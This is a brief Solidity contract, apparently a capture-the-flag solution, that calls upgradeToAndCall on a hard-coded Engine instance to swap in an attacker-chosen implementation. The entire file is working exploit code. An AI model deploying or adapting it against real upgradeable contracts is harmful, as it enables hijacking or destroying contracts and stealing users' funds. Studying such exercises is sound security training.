pragma solidity ^0.8.0;

interface IEngine {
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}


contract AttackerUpgrade {
    address public constant instance = address(0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968);

    function performUpgrade() public {
        IEngine(instance).upgradeToAndCall(0x2279B7A0a67DB372996a5Fab50D91eAA73d2eBe6, "\x00");
    }
}